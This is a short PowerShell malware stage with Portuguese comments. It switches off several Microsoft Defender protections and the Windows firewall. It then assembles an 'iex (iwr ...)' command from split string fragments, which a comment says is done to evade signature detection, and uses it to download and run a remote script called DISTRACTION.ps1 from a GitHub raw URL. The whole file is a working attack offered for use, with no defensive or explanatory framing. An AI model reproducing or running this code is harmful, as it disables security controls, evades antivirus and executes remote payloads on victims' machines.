# Desativar proteções do Defender (as que são possíveis sem mexer na Tamper Protection)
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue

# Firewall
netsh advfirewall set allprofiles state off

# Construir o comando de download da distração com strings partidas (evita assinatura)
$p1 = 'ie'; $p2 = 'x'; $p3 = ' (i'; $p4 = 'wr'; $p5 = ' -U'; $p6 = 'ri '; $p7 = "'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1'"; $p8 = ' -UseBasicParsing).Content'
$command = $p1+$p2+$p3+$p4+$p5+$p6+$p7+$p8
& ($p1+$p2) $command   # equivale a iex $command, mas também fragmentado
